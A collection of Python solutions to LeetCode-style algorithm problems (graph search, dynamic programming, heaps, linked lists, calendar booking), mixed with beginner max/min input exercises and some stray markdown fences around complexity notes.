        for employee in employees:
            d[employee.id] = [employee.importance, employee.subordinates]

        queue = deque([id])
        result = 0

        while queue:
            employee_id = queue.popleft()
            result += d[employee_id][0]
            queue.extend(d[employee_id][1])
        return result

from collections import Counter
from heapq import *


class Solution:
    def topKFrequent(self, words: List[str], k: int) -> List[str]:
        q = []
        for key, val in Counter(words).items():
            heappush(q, (-val, key))
        result = []
        for _ in range(k):
            result.append(heappop(q)[1])
        return result

class Solution:
    def maxAreaOfIsland(self, grid: List[List[int]]) -> int:
        if not grid or not grid[0]:
            return 0
        area = 0
        m, n = len(grid), len(grid[0])
        for i in range(m):
            for j in range(n):
                if grid[i][j] == 1:
                    area = max(area, self.dfs(grid, i, j, set()))
        return area

    def dfs(self, grid, i, j, visited):
        if i < 0 or i >= len(grid) or j < 0 or j >= len(grid[0]) or grid[i][j] == 0:
            return 0
        grid[i][j] = 0
        s = 1
        for x, y in [(i + 1, j), (i - 1, j), (i, j - 1), (i, j + 1)]:
            s += self.dfs(grid, x, y, visited)
        return s

from collections import Counter


class Solution:
    def findShortestSubArray(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        first, last = {}, {}
        degree = Counter(nums)
        for i in range(len(nums)):
            first.setdefault(nums[i], i)
            last[nums[i]] = i
        max_degree = max(degree.values())
        return min(
            last[key] - first[key] + 1 for key in degree if degree[key] == max_degree
        )

# Time: O(K*2^N)


class Solution:
    def canPartitionKSubsets(self, nums: List[int], k: int) -> bool:
        if sum(nums) % k != 0:
            return False
        nums.sort(reverse=True)

        def dfs(idx, target, s):
            if idx == len(nums):
                return True
            for i in range(k):
                if s[i] + nums[idx] <= target:
                    s[i] += nums[idx]
                    if dfs(idx + 1, target, s):
                        return True
                    s[i] -= nums[idx]
            return False

        return dfs(0, sum(nums) // k, [0] * k)

# Time : O(nlogn)
class Solution:
    def fallingSquares(self, positions: List[List[int]]) -> List[int]:
        location, height = [0], [0]
        prev, result = 0, []
        for i, j in positions:
            l = bisect.bisect_right(location, i)
            r = bisect.bisect_left(location, i + j)
            high = max(height[l - 1 : r] or [0]) + j
            location[l:r] = [i, i + j]
            height[l:r] = [high, height[r - 1]]
            prev = max(high, prev)
            result.append(prev)
        return result

# 6. Write a Python Program to take 3 numbers as input and find max of them

a = int(input("Enter the first number: "))
b = int(input("Enter the second number: "))
c = int(input("Enter the third number: "))

result = max(a, b, c)

print("Max of the numbers entered is {}".format(result))

class Solution:
    def reverse(self, x):
        """
        :type x: int
        :rtype: int
        """
        result = 0
        neg = False
        if x < 0:
            neg = True
            x = -x
        while x != 0:
            x, p = divmod(x, 10)
            if not neg and (
                (result > 2147483647 // 10) or (result == 2147483647 // 10 and p > 7)
            ):
                return 0
            if neg and (
                result > 2147483648 // 10 or (result == 2147483648 // 10 and p > 8)
            ):
                return 0
            result = result * 10 + p
        return -result if neg else result

class Solution:
    def climbStairs(self, n: int) -> int:
        if n <= 1:
            return n
        s1 = 1
        s2 = 2
        for i in range(2, n):
            s = s1 + s2
            s1, s2 = s2, s
        return s2

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def insertIntoBST(self, root: TreeNode, val: int) -> TreeNode:
        if not root:
            return TreeNode(val)
        if root.val > val:
            root.left = self.insertIntoBST(root.left, val)
        if root.val < val:
            root.right = self.insertIntoBST(root.right, val)
        return root
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val=None, next=None):
        self.val = val
        self.next = next```


```py


class Solution:
    def insert(self, head: "Node", insertVal: int) -> "Node":
        node = Node(insertVal, head)
        if not head:
            node.next = node
            return node

        prev, curr = head, head.next
        while True:
            if prev.val <= insertVal <= curr.val:
                break
            elif prev.val > curr.val and (insertVal > prev.val or insertVal < curr.val):
                break
            prev, curr = prev.next, curr.next
            if prev == head:
                break
        prev.next = node
        node.next = curr
        return head

class Solution:
    def simplifyPath(self, path):
        """
        :type path: str
        :rtype: str
        """
        stack = []
        for p in path.split("/"):
            if p == "..":
                if stack:
                    stack.pop()
            elif p and p != ".":
                stack.append(p)
        return "/" + "/".join(stack)

class Solution:
    def minimumDeleteSum(self, s1, s2):
        """
        :type s1: str
        :type s2: str
        :rtype: int
        """
        l1, l2 = len(s1), len(s2)
        dp = [[0] * (l2 + 1) for _ in range(l1 + 1)]
        for i in range(l1):
            for j in range(l2):
                if s1[i] == s2[j]:
                    dp[i + 1][j + 1] = dp[i][j] + ord(s1[i])
                else:
                    dp[i + 1][j + 1] = max(dp[i + 1][j], dp[i][j + 1])
        result = sum(map(ord, s1 + s2)) - dp[l1][l2] * 2
        return result

# Time: O(N), Space: O(1)
class Solution:
    def numSubarrayProductLessThanK(self, nums: List[int], k: int) -> int:
        if not nums:
            return 0
        start, product = 0, 1
        result = 0
        for end in range(len(nums)):
            product *= nums[end]
            while start <= end and product >= k:
                product //= nums[start]
                start += 1
            result += end - start + 1
        return result

class Solution:
    def maxProfit(self, prices: List[int], fee: int) -> int:
        sell, buy = 0, float("-inf")
        for price in prices:
            sell = max(sell, buy + price - fee)
            buy = max(buy, sell - price)
        return sell
````

````py
Time: O(mn)
Space: O(m or n)```


```py


class Solution:
    def minDistance(self, word1: str, word2: str) -> int:
        prev = [0]
        m, n = len(word2), len(word1)
        for i in range(n):
            prev.append(prev[i] + 1)

        for i in range(m):
            curr = [i + 1]
            for j in range(n):
                tmp = prev[j] if word1[j] == word2[i] else prev[j] + 1
                curr.append(min(curr[j] + 1, prev[j + 1] + 1, tmp))
            prev = curr
        return prev[n]

class Solution:
    def accountsMerge(self, accounts: List[List[str]]) -> List[List[str]]:
        roots, names = {}, {}
        for account in accounts:
            for i in account[1:]:
                roots[i] = i
                names[i] = account[0]

        for account in accounts:
            r = self.find(account[1], roots)
            for i in account[2:]:
                roots[self.find(i, roots)] = r

        unions = defaultdict(set)
        for account in accounts:
            for i in account[1:]:
                unions[self.find(i, roots)].add(i)

        result = []
        for k, v in unions.items():
            result.append([names[k]] + sorted(list(v)))
        return result

    def find(self, node, roots):
        root = node
        while roots[root] != root:
            root = roots[root]
        while node != root:
            roots[node], node = root, roots[node]
        return root

class Solution:
    def candyCrush(self, board: List[List[int]]) -> List[List[int]]:
        while True:
            crush = set()
            for i in range(len(board)):
                for j in range(len(board[0])):
                    if (
                        j > 1
                        and board[i][j]
                        and board[i][j] == board[i][j - 1] == board[i][j - 2]
                    ):
                        crush |= {(i, j), (i, j - 1), (i, j - 2)}
                    if (
                        i > 1
                        and board[i][j]
                        and board[i - 2][j] == board[i - 1][j] == board[i][j]
                    ):
                        crush |= {(i, j), (i - 1, j), (i - 2, j)}

            if not crush:
                break
            for (i, j) in crush:
                board[i][j] = 0

            for j in range(len(board[0])):
                idx = len(board) - 1
                for i in range(len(board) - 1, -1, -1):
                    if board[i][j]:
                        board[idx][j] = board[i][j]
                        idx -= 1
                for i in range(idx + 1):
                    board[i][j] = 0
        return board

from typing import List


class Solution:
    def pivotIndex(self, nums: List[int]) -> int:
        left, right = 0, sum(nums)
        for i in range(len(nums)):
            right -= nums[i]
            if left == right:
                return i
            left += nums[i]
        return -1

class MyCalendar:
    def __init__(self):
        self.maps = []

    def book(self, start: int, end: int) -> bool:
        bisect.insort_left(self.maps, [start, 1])
        bisect.insort_left(self.maps, [end, -1])
        count = 0
        for i, val in self.maps:
            count += val
            if count > 1:
                self.maps.remove([start, 1])
                self.maps.remove([end, -1])
                return False
        return True


# Your MyCalendar object will be instantiated and called as such:
# obj = MyCalendar()
# param_1 = obj.book(start,end)

class Solution(object):
    def setZeroes(self, matrix):
        """
        :type matrix: List[List[int]]
        :rtype: void Do not return anything, modify matrix in-place instead.
        """
        col0 = 1
        for row in range(len(matrix)):
            if matrix[row][0] == 0:
                col0 = 0
            for col in range(1, len(matrix[0])):
                if matrix[row][col] == 0:
                    matrix[row][0] = 0
                    matrix[0][col] = 0
        for row in range(len(matrix) - 1, -1, -1):
            for col in range(len(matrix[0]) - 1, 0, -1):
                if matrix[row][0] == 0 or matrix[0][col] == 0:
                    matrix[row][col] = 0
            if col0 == 0:
                matrix[row][0] = 0

class MyCalendarTwo:
    def __init__(self):
        self.maps = []

    def book(self, start: int, end: int) -> bool:
        bisect.insort_left(self.maps, [start, 1])
        bisect.insort_left(self.maps, [end, -1])
        count = 0
        for i, val in self.maps:
            count += val
            if count > 2:
                self.maps.remove([start, 1])
                self.maps.remove([end, -1])
                return False
        return True


# Your MyCalendarTwo object will be instantiated and called as such:
# obj = MyCalendarTwo()
# param_1 = obj.book(start,end)

class MyCalendarThree:
    def __init__(self):
        self.maps = []

    def book(self, start: int, end: int) -> int:
        bisect.insort_left(self.maps, (start, 1))
        bisect.insort_left(self.maps, (end, -1))
        result, count = 0, 0
        for i, v in self.maps:
            count += v
            result = max(result, count)
        return result


# Your MyCalendarThree object will be instantiated and called as such:
# obj = MyCalendarThree()
# param_1 = obj.book(start,end)

class Solution:
    def floodFill(
        self, image: List[List[int]], sr: int, sc: int, newColor: int
    ) -> List[List[int]]:
        def dfs(i, j, val):
            if (
                i < 0
                or i >= len(image)
                or j < 0
                or j >= len(image[0])
                or image[i][j] != val
                or val == newColor
            ):
                return
            image[i][j] = newColor
            for x, y in [(i + 1, j), (i - 1, j), (i, j + 1), (i, j - 1)]:
                dfs(x, y, val)

        dfs(sr, sc, image[sr][sc])
        return image

from typing import List


class Solution:
    def asteroidCollision(self, asteroids: List[int]) -> List[int]:
        result = []
        for asteroid in asteroids:
            if not result or asteroid > 0:
                result.append(asteroid)
            else:
                while result and result[-1] > 0:
                    if result[-1] > -asteroid:
                        break
                    elif result[-1] < -asteroid:
                        result.pop()
                    else:
                        result.pop()
                        break
                else:
                    result.append(asteroid)
        return result
````

````py
Time: O(log mn)```


```py


class Solution:
    def searchMatrix(self, matrix, target):
        """
        :type matrix: List[List[int]]
        :type target: int
        :rtype: bool
        """
        if len(matrix) == 0 or len(matrix[0]) == 0:
            return False

        m, n = len(matrix), len(matrix[0])
        l, r = 0, m * n - 1
        while l <= r:
            mid = l + (r - l) // 2
            val = matrix[mid // n][mid % n]
            if val == target:
                return True
            elif val > target:
                r = mid - 1
            else:
                l = mid + 1
        return False

class Solution:
    def cherryPickup(self, grid: List[List[int]]) -> int:
        if grid[-1][-1] == -1:
            return 0
        N = len(grid)
        memo = {}

        def search(x1, y1, x2, y2):
            if (x1, y1, x2, y2) in memo:
                return memo[(x1, y1, x2, y2)]
            if x1 == N or y1 == N or x2 == N or y2 == N:
                return -1
            if x1 == N - 1 and y1 == N - 1 and x2 == N - 1 and y2 == N - 1:
                return grid[N - 1][N - 1]
            if grid[x1][y1] == -1 or grid[x2][y2] == -1:
                return -1

            s1 = search(x1 + 1, y1, x2 + 1, y2)
            s2 = search(x1 + 1, y1, x2, y2 + 1)
            s3 = search(x1, y1 + 1, x2 + 1, y2)
            s4 = search(x1, y1 + 1, x2, y2 + 1)

            temp = max(s1, s2, s3, s4)
            if temp == -1:
                result = -1
            else:
                if x1 == x2 and y1 == y2:
                    result = temp + grid[x1][y1]
                else:
                    result = temp + grid[x1][y1] + grid[x2][y2]
            memo[(x1, y1, x2, y2)] = result
            return result

        return max(search(0, 0, 0, 0), 0)

from collections import defaultdict, deque


class Solution:
    def networkDelayTime(self, times: List[List[int]], N: int, K: int) -> int:
        time = [0] + [float("inf")] * N
        nodes = defaultdict(list)
        for item in times:
            nodes[item[0]].append((item[1], item[2]))

        queue = deque([(K, 0)])
        while queue:
            node, t = queue.popleft()
            if t < time[node]:
                time[node] = t
                for (v, w) in nodes[node]:
                    queue.append((v, w + t))

        return max(time) if max(time) != float("inf") else -1

class Solution:
    def minCostClimbingStairs(self, cost):
        """
        :type cost: List[int]
        :rtype: int
        """
        if not cost or len(cost) <= 2:
            return 0
        result = [0] * (len(cost) + 1)
        for i in range(2, len(cost) + 1):
            result[i] = min(result[i - 1] + cost[i - 1], result[i - 2] + cost[i - 2])
        return result[-1]

class Solution:
    def sortColors(self, nums):
        """
        :type nums: List[int]
        :rtype: void Do not return anything, modify nums in-place instead.
        """
        i, j = 0, 0
        for k in range(len(nums)):
            v = nums[k]
            nums[k] = 2
            if v < 2:
                nums[j] = 1
                j += 1
            if v == 0:
                nums[i] = 0
                i += 1

class Solution:
    def countCornerRectangles(self, grid):
        """
        :type grid: List[List[int]]
        :rtype: int
        """
        result = 0
        if not grid or not grid[0]:
            return result
        m, n = len(grid), len(grid[0])
        for i in range(m - 1):
            for ii in range(i + 1, m):
                count = 0
                for j in range(n):
                    if grid[i][j] and grid[ii][j]:
                        result += count
                        count += 1
        return result

from typing import List


class Solution:
    def pourWater(self, heights: List[int], V: int, K: int) -> List[int]:
        for _ in range(V):
            index = K
            # move left
            for i in range(K - 1, -1, -1):
                if heights[i + 1] > heights[i]:
                    index = i
                elif heights[i + 1] < heights[i]:
                    break
            if index == K:
                for i in range(K + 1, len(heights)):
                    if heights[i - 1] > heights[i]:
                        index = i
                    elif heights[i - 1] < heights[i]:
                        break
            heights[index] += 1
        return heights

from collections import Counter


class Solution:
    def minWindow(self, s: str, t: str) -> str:
        d = Counter(t)
        start, end = 0, 0
        result = ""
        count = len(d)
        while end < len(s):
            c = s[end]
            if c in d:
                d[c] -= 1
                if d[c] == 0:
                    count -= 1
            end += 1
            while count == 0 and start < len(s):
                if result == "":
                    result = s[start:end]
                else:
                    if len(s[start:end]) < len(result):
                        result = s[start:end]
                curr = s[start]
                if curr in d:
                    d[curr] += 1
                    if d[curr] > 0:
                        count += 1
                start += 1
        return result

class Solution:
    def countPrimeSetBits(self, L, R):
        """
        :type L: int
        :type R: int
        :rtype: int
        """
        return sum(
            map(
                lambda x: bin(x).count("1") in [2, 3, 5, 7, 11, 13, 17, 19],
                range(L, R + 1),
            )
        )

class Solution:
    def partitionLabels(self, S):
        """
        :type S: str
        :rtype: List[int]
        """
        last_index = {c: i for i, c in enumerate(S)}
        left = right = 0
        result = []
        for i in range(0, len(S)):
            right = max(right, last_index[S[i]])
            if i == right:
                result.append(right - left + 1)
                left = i + 1
        return result


class Solution:
    def partitionLabels(self, S: str) -> List[int]:
        d = set()
        start, end = 0, 0
        result = []
        while end < len(S):
            if (
                S[end] not in d
                and S[end] not in S[end + 1 :]
                and all(c not in S[end + 1 :] for c in d)
            ):
                result.append(1)
                start = end + 1
            elif S[end] in d and all(c not in S[end + 1 :] for c in d):
                result.append(end - start + 1)
                start = end + 1
            d.add(S[end])
            end += 1
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def lcaDeepestLeaves(self, root: TreeNode) -> TreeNode:
        def dfs(node):
            if not node:
                return 0, None
            h1, lca1 = dfs(node.left)
            h2, lca2 = dfs(node.right)
            if h1 > h2:
                return h1 + 1, lca1
            if h2 > h1:
                return h2 + 1, lca2
            return h1 + 1, node

        return dfs(root)[1]
````

````py
time: O(N)
space: O(1)```


```py
import heapq
from collections import Counter


class Solution:
    def reorganizeString(self, S):
        """
        :type S: str
        :rtype: str
        """
        result = ""
        c = Counter(S)
        l = []
        for k, v in c.items():
            heapq.heappush(l, (-v, k))
        prev_v, prev_k = 0, ""
        while l:
            v, k = heapq.heappop(l)
            result += k
            if prev_v < 0:
                heapq.heappush(l, (prev_v, prev_k))
            prev_v = v + 1
            prev_k = k
        return "" if len(result) != len(S) else result
````

````py
O(n^min(k, n-k))```


```py


class Solution:
    def combine(self, n: int, k: int) -> List[List[int]]:
        result = []
        self.dfs(list(range(1, n + 1)), k, [], result)
        return result

    def dfs(self, arr, k, path, result):
        if k < 0:
            return
        if k == 0:
            result.append(path)
        for i in range(len(arr)):
            self.dfs(arr[i + 1 :], k - 1, path + [arr[i]], result)

class Solution:
    # def numJewelsInStones(self, J, S):
    #     """
    #     :type J: str
    #     :type S: str
    #     :rtype: int
    #     """
    #     S = collections.Counter(S)
    #     J = collections.Counter(J)
    #     result = 0
    #     for key, val in S.items():
    #         if key in J:
    #             result += val
    #     return result

    def numJewelsInStones(self, J, S):
        return sum(map(J.count, S))

def slidingPuzzle(self, board: List[List[int]]) -> int:
    target = "123450"
    board = "".join(str(board[i][j]) for i in range(2) for j in range(3))
    directions = [[1, 3], [0, 2, 4], [1, 5], [0, 4], [1, 3, 5], [2, 4]]
    visited = {board}
    queue = deque([(board, 0)])
    while queue:
        curr, move = queue.popleft()
        if curr == target:
            return move

        idx = curr.index("0")
        for i in directions[idx]:
            temp = list(curr)
            temp[i], temp[idx] = temp[idx], temp[i]
            temp = "".join(temp)
            if temp not in visited:
                visited.add(temp)
                queue.append((temp, move + 1))
    return -1

class Solution:
    def canTransform(self, start: str, end: str) -> bool:
        if len(start) != len(end):
            return False
        s = [(c, i) for i, c in enumerate(start) if c == "L" or c == "R"]
        e = [(c, j) for j, c in enumerate(end) if c == "L" or c == "R"]

        if len(s) != len(e):
            return False

        for (sc, i), (ec, j) in zip(s, e):
            if sc != ec:
                return False
            if sc == "L":
                if i < j:
                    return False
            if sc == "R":
                if i > j:
                    return False
        return True
````

````py
Given a set of distinct integers, nums, return all possible subsets (the power set).```


```py


class Solution(object):
    def subsets(self, nums):
        """
        :type nums: List[int]
        :rtype: List[List[int]]
        """
        result = [[]]
        for num in nums:
            for j in range(len(result)):
                result.append(result[j] + [num])
        return result

class Solution:
    def isBipartite(self, graph: List[List[int]]) -> bool:
        colors = [0 for _ in range(len(graph))]
        for i in range(len(graph)):
            if colors[i] == 0 and not self.dfs(i, colors, 1, graph):
                return False
        return True

    def dfs(self, node, colors, color, graph):
        if colors[node] != 0:
            return colors[node] == color
        colors[node] = color
        for child in graph[node]:
            if not self.dfs(child, colors, -color, graph):
                return False
        return True

from collections import deque, defaultdict


class Solution:
    def findCheapestPrice(
        self, n: int, flights: List[List[int]], src: int, dst: int, K: int
    ) -> int:
        if not flights:
            return -1

        costs = [float("inf")] * n

        cities = defaultdict(list)
        for flight in flights:
            cities[flight[0]].append((flight[1], flight[2]))

        queue = deque([(src, 0, 0)])
        while queue:
            curr, stop, cost = queue.popleft()
            if stop > K + 1:
                break
            if cost < costs[curr]:
                costs[curr] = cost
                for n in cities[curr]:
                    queue.append((n[0], stop + 1, cost + n[1]))

        return costs[dst] if costs[dst] != float("inf") else -1

# time O(m*n*len(word))
class Solution:
    def exist(self, board: List[List[str]], word: str) -> bool:
        for i in range(len(board)):
            for j in range(len(board[0])):
                if self.dfs(board, i, j, set(), word, 0):
                    return True
        return False

    def dfs(self, board, x, y, visited, word, idx):
        if idx == len(word):
            return True

        if (
            0 <= x < len(board)
            and 0 <= y < len(board[0])
            and (x, y) not in visited
            and board[x][y] == word[idx]
        ):
            for direction in [(0, -1), (0, 1), (1, 0), (-1, 0)]:
                new_x, new_y = x + direction[0], y + direction[1]
                if self.dfs(board, new_x, new_y, visited | {(x, y)}, word, idx + 1):
                    return True
        return False

class Solution:
    def rotateString(self, A: str, B: str) -> bool:
        return len(A) == len(B) and B in A + A

# 7. Write a python program to take three numbers and find minimum of them

a = int(input("Enter the first number: "))
b = int(input("Enter the second number: "))
c = int(input("Enter the thrid number: "))

result = min(a, b, c)

print("Enter minimum of three numbers entered is {}".format(result))

class Solution(object):
    def myAtoi(self, str):
        """
        :type str: str
        :rtype: int
        """
        MAX, MIN = 2147483647, -2147483648
        if str == "":
            return 0
        str = str.strip()  # remove white space
        base, sign, index = 0, 1, 0
        if str[index] == "-" or str[index] == "+":
            sign = -1 if str[index] == "-" else 1
            index += 1
        while index < len(str) and str[index] >= "0" and str[index] <= "9":
            if base > MAX / 10 or (base == MAX / 10 and int(str[index]) > 7):
                return MAX if sign == 1 else MIN
            base = base * 10 + int(str[index])
            index += 1
        return sign * base

class Solution:
    def removeDuplicates(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        if not nums:
            return 0
        if len(nums) == 1:
            return 1
        idx = 1
        for n in nums[2:]:
            if n > nums[idx - 1]:
                idx += 1
                nums[idx] = n
        return idx + 1

class Solution:
    def search(self, nums, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: bool
        """
        if not nums:
            return False
        l, r = 0, len(nums) - 1
        while l <= r:
            m = l + (r - l) // 2
            if nums[m] == target:
                return True
            if nums[r] > nums[m]:
                if nums[m] <= target <= nums[r]:
                    l = m + 1
                else:
                    r = m - 1
            elif nums[r] < nums[m]:
                if nums[l] <= target <= nums[m]:
                    r = m - 1
                else:
                    l = m + 1
            else:
                r -= 1
        return nums[l] == target

class Solution:
    def subdomainVisits(self, cpdomains: List[str]) -> List[str]:
        d = {}
        for cpdomain in cpdomains:
            count, domain = int(cpdomain.split()[0]), cpdomain.split()[1]
            domains = domain.split(".")
            for i in range(len(domains)):
                subdomain = ".".join(domains[i:])
                d[subdomain] = d.get(subdomain, 0) + count
        return [str(v) + " " + k for k, v in d.items()]

from collections import deque, defaultdict


class Solution:
    def numBusesToDestination(self, routes: List[List[int]], S: int, T: int) -> int:
        # get the stop-route relations
        stop_route = defaultdict(set)
        for i, route in enumerate(routes):
            for j in route:
                stop_route[j].add(i)

        queue = deque([(S, 0)])
        visited = {S}
        while queue:
            curr_stop, bus = queue.popleft()
            if curr_stop == T:
                return bus
            for r in stop_route[curr_stop]:
                for s in routes[r]:
                    if s not in visited:
                        queue.append((s, bus + 1))
                        visited.add(s)
                routes[r] = []

        return -1

import re
from collections import Counter


class Solution:
    def mostCommonWord(self, paragraph: str, banned: List[str]) -> str:
        banned = set(banned)
        words = re.findall(r"\w+", paragraph.lower())
        return Counter(w for w in words if w not in banned).most_common(1)[0][0]

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def deleteDuplicates(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """
        dummy = prev = ListNode(0)
        dummy.next = head
        while head and head.next:
            if head.val == head.next.val:
                while head and head.next and head.val == head.next.val:
                    head = head.next
                prev.next = head.next
            else:
                prev = prev.next
            head = head.next
        return dummy.next

class Solution:
    def toGoatLatin(self, S: str) -> str:
        result = []
        S = S.split()
        for i in range(len(S)):
            suffix = "".join(["a"] * (i + 1))
            if S[i][0].lower() in {"a", "e", "i", "o", "u"}:
                result.append(S[i] + "ma" + suffix)
            else:
                result.append(S[i][1:] + S[i][0] + "ma" + suffix)
        return " ".join(result)

class Solution:
    def numFriendRequests(self, ages: List[int]) -> int:
        result = 0
        ages.sort()
        for age in ages:
            idx1 = bisect.bisect(ages, age)
            idx2 = bisect.bisect(ages, age * 0.5 + 7)
            result += max(0, idx1 - idx2 - 1)
        return result
````

````py
time: O(square_root(N))```


```py


class Solution:
    ### (x + (m-1) + x)*m/2 = N
    ### xm + (m^2 - m)2 = N
    ### xm = N + m/2 - m^2/2
    def consecutiveNumbersSum(self, N: "int") -> "int":
        m = 1
        ret = 0
        while True:
            xm = N + m / 2 - (m * m) / 2
            if xm <= 0:
                break
            if xm % m == 0:
                ret += 1
            m += 1
        return ret

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def deleteDuplicates(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """
        dummy = prev = ListNode(0)
        dummy.next = head
        while head and head.next:
            if head.val == head.next.val:
                while head and head.next and head.val == head.next.val:
                    head = head.next
                prev.next = head
            prev = prev.next
            head = head.next

        return dummy.next

class Solution:
    def largestOverlap(self, A: List[List[int]], B: List[List[int]]) -> int:
        A = [(x, y) for x in range(len(A)) for y in range(len(A[0])) if A[x][y]]
        B = [(x, y) for x in range(len(B)) for y in range(len(B[0])) if B[x][y]]
        count = collections.Counter(
            (ax - bx, ay - by) for (ax, ay) in A for (bx, by) in B
        )
        return max(count.values() or [0])

class Solution:
    def largestRectangleArea(self, heights: List[int]) -> int:
        heights += [0]
        stack = [-1]
        result = 0
        for i in range(len(heights)):
            while heights[i] < heights[stack[-1]]:
                h = heights[stack.pop()]
                result = max(result, h * (i - stack[-1] - 1))
            stack.append(i)
        return result

# """
# This is Master's API interface.
# You should not implement it, or speculate about its implementation
# """
# class Master:
#    def guess(self, word):
#        """
#        :type word: str
#        :rtype int
#        """

from collections import defaultdict


class Solution:
    def findSecretWord(self, wordlist, master):
        """
        :type wordlist: List[Str]
        :type master: Master
        :rtype: None
        """

        def compPair(x, y):
            return sum(c1 == c2 for c1, c2 in zip(x, y))

        def mostOverlapWord():
            count = [defaultdict(lambda: 0) for _ in range(6)]
            for word in candidates:
                for i, c in enumerate(word):
                    count[i][c] += 1
            return max(
                candidates, key=lambda x: sum(count[i][c] for i, c in enumerate(x))
            )

        candidates = wordlist[:]
        while candidates:
            word = mostOverlapWord()
            match = master.guess(word)
            if match == 6:
                return
            candidates = [w for w in candidates if compPair(word, w) == match]

from collections import Counter


class Solution:
    def isNStraightHand(self, hand: List[int], W: int) -> bool:
        counter = Counter(hand)
        for num in sorted(counter):
            if counter[num] > 0:
                for diff in range(W)[::-1]:
                    counter[num + diff] -= counter[num]
                    if counter[num + diff] < 0:
                        return False
        return True

from collections import deque


class Solution:
    def shortestPathLength(self, graph: List[List[int]]) -> int:
        N = len(graph)
        visited = set()
        end = (1 << N) - 1
        queue = deque([(node, 1 << node, 0) for node in range(N)])
        while queue:
            node, state, path = queue.popleft()
            if state == end:
                return path
            for child in graph[node]:
                if (state | 1 << child, child) not in visited:
                    visited.add((state | 1 << child, child))
                    queue.append((child, state | 1 << child, path + 1))
        return -1


# Example
# if we have node of 0, 1, 2, 3
# with bitmask, when all nodes are visited, the final state should be 1111
# the binary form 1111 will equal to (1 << N)-1
# where 0001 represents node 0 is visisted and 0010 represents node 1 is visited

from typing import List


class Solution:
    def maximalRectangle(self, matrix: List[List[str]]) -> int:
        if not matrix or len(matrix[0]) == 0:
            return 0
        result, n = 0, len(matrix[0])
        heights = [0] * (n + 1)
        for row in matrix:
            for i in range(n):
                heights[i] = heights[i] + 1 if row[i] == "1" else 0
            stack = [-1]
            for i in range(len(heights)):
                while heights[i] < heights[stack[-1]]:
                    h = heights[stack.pop()]
                    result = max(result, h * (i - 1 - stack[-1]))
                stack.append(i)
        return result

class ExamRoom:
    def __init__(self, N: int):
        self.N = N
        self.seats = []

    def seat(self) -> int:
        if not self.seats:
            target = 0
        else:
            d, target = self.seats[0], 0
            for x, y in zip(self.seats, self.seats[1:]):
                if (y - x) // 2 > d:
                    d, target = (y - x) // 2, (x + y) // 2
            if self.N - 1 - self.seats[-1] > d:
                target = self.N - 1
        bisect.insort(self.seats, target)
        return target

    def leave(self, p: int) -> None:
        self.seats.remove(p)


# Your ExamRoom object will be instantiated and called as such:
# obj = ExamRoom(N)
# param_1 = obj.seat()
# obj.leave(p)

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def partition(self, head, x):
        """
        :type head: ListNode
        :type x: int
        :rtype: ListNode
        """
        dummy1 = prev = ListNode(0)
        dummy2 = after = ListNode(0)
        while head:
            if head.val < x:
                prev.next = head
                prev = prev.next
            else:
                after.next = head
                after = after.next
            head = head.next
        prev.next = dummy2.next
        after.next = None
        return dummy1.next

# time: O(2^n)
class Solution:
    def __init__(self):
        self.memo = {}

    def isScramble(self, s1, s2):
        """
        :type s1: str
        :type s2: str
        :rtype: bool
        """
        if (s1, s2) in self.memo:
            return self.memo[(s1, s2)]
        if s1 == s2:
            self.memo[(s1, s2)] = True
            return True
        if len(s1) != len(s2) or sorted(s1) != sorted(s2):
            self.memo[(s1, s2)] = False
            return False
        for i in range(1, len(s1)):
            if self.isScramble(s1[:i], s2[:i]) and self.isScramble(s1[i:], s2[i:]):
                return True
            if self.isScramble(s1[:i], s2[-i:]) and self.isScramble(s1[i:], s2[:-i]):
                return True
        self.memo[(s1, s2)] = False
        return False

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def middleNode(self, head: ListNode) -> ListNode:
        slow = fast = head
        while fast and fast.next:
            fast = fast.next.next
            slow = slow.next
        return slow

class Solution(object):
    def merge(self, nums1, m, nums2, n):
        """
        :type nums1: List[int]
        :type m: int
        :type nums2: List[int]
        :type n: int
        :rtype: void Do not return anything, modify nums1 in-place instead.
        """
        while m > 0 and n > 0:
            if nums1[m - 1] > nums2[n - 1]:
                nums1[m + n - 1] = nums1[m - 1]
                m -= 1
            else:
                nums1[m + n - 1] = nums2[n - 1]
                n -= 1
        if n > 0:
            nums1[:n] = nums2[:n]

class Solution:
    def superEggDrop(self, K: int, N: int) -> int:
        dp = [[0 for _ in range(K + 1)] for _ in range(N + 1)]

        for i in range(1, N + 1):
            for k in range(1, K + 1):
                dp[i][k] = dp[i - 1][k - 1] + dp[i - 1][k] + 1
            if dp[i][k] >= N:
                return i
        return -1

class Solution:
    def findAndReplacePattern(self, words: List[str], pattern: str) -> List[str]:
        result = []
        for word in words:
            if len(set(zip(word, pattern))) == len(set(word)) == len(
                set(pattern)
            ) and len(word) == len(pattern):
                result.append(word)
        return result

class Solution:
    def superEggDrop(self, K, N):
        """
        :type K: int
        :type N: int
        :rtype: int
        """
        dp = [[0] * (K + 1) for _ in range(N + 1)]
        for i in range(1, N + 1):
            for j in range(1, K + 1):
                dp[i][j] = dp[i - 1][j - 1] + dp[i - 1][j] + 1
                if dp[i][j] >= N:
                    return i
        return 0

class Solution:
    def isMonotonic(self, A: List[int]) -> bool:
        increase, decrease = False, False
        for i in range(len(A) - 1):
            if A[i] < A[i + 1]:
                increase = True
            if A[i] > A[i + 1]:
                decrease = True
        return True if not (increase & decrease) else False

# 8. Write a Python Program to take 4 numbers as input and find max of them

a = int(input("Enter the first number: "))
b = int(input("Enter the second number: "))
c = int(input("Enter the third number: "))
